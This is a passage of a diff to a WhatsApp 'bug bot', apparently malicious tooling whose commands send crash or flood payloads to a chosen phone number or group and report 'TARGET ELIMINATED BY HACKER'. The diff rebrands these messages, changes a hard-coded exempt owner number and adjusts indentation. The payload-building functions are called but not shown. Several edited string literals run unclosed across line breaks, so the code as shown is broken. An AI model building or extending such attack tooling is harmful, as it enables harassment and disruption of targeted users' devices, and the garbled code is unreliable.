+    return replygcxeon("The number is not registered on WhatsApp mumu");
   }
   replygcxeon("please wait, " + command + " bug is in process..");
   await sleep(2000); // Adjusted sleep time for clarity
@@ -2125,7 +2124,8 @@ case "xandroid": {
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    " Using *" + command + "* ✅\n\nPause 
+    *WE ARE HACKER*💻*.", 
     [whatsappNumber]
   );
 }
@@ -2145,7 +2145,7 @@ case "xios": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2349066528353") {
+  if (cleanedNumber == "2348140825959") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2156,15 +2156,16 @@ case "xios": {
   sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "**TARGET 🎯 ELIMINATED BY HACKER ** @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 
+    *WE ARE HACKER*💻*.", 
     [whatsappNumber]
   );
 }
 break;
 case "xios2":
   {
-	if (!isPremium) return replygcxeon(mess.prem)
+    if (!isPremium) return replygcxeon(mess.prem)
     if (!isBot) {
       return replygcxeon("*This feature is for the bot only!*");
     }
@@ -2184,7 +2185,7 @@ case "xios2":
   break;
   case "xandroid2":
   {
-	if (!isPremium) return replygcxeon(mess.prem)
+    if (!isPremium) return replygcxeon(mess.prem)
     if (!isBot) {
       return replygcxeon("*This feature is for the bot only!*");
     }
@@ -2219,7 +2220,7 @@ case "xios2":
       await sleep(2000); // Adjusted sleep time for clarity
       sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
-      replygcxeon("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
+      replygcxeon("*DONE✅ BUG HAS BEEN SENT TO THE GROUP BY HACKER FAMILY!.*");
       XeonBotInc.groupLeave(groupTarget);
     } catch (error) {
       replygcxeon(util.format(error));
@@ -2241,7 +2242,7 @@ case "xios2":
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2349066528353") {
+  if (cleanedNumber == "2348140825959") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2252,8 +2253,9 @@ case "xios2":
   sendMixedMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "**TARGET 🎯 ELIMINATED BY HACKER ** @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 
+    *WE ARE HACKER*💻*.", 
     [whatsappNumber]
   );
 }
@@ -2273,7 +2275,7 @@ case "xsysui": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2349066528353") {
+  if (cleanedNumber == "2348140825959") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2284,8 +2286,9 @@ case "xsysui": {
   sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "**TARGET 🎯 ELIMINATED BY HACKER ** @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause 
+    *WE ARE HACKER*💻*.", 
     [whatsappNumber]
   );
 }
@@ -2426,7 +2429,7 @@ ${readmore}
 
 𝐁𝐀𝐃-𝐁𝐎𝐈
 
-𝐋𝐎𝐑𝐃 𝐄𝐌𝐏𝐄𝐑𝐎𝐑
+𝐋𝐎𝐑𝐃 N O N A M E
 
 𝐋𝐎𝐑𝐃 𝐓𝐊𝐌
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`
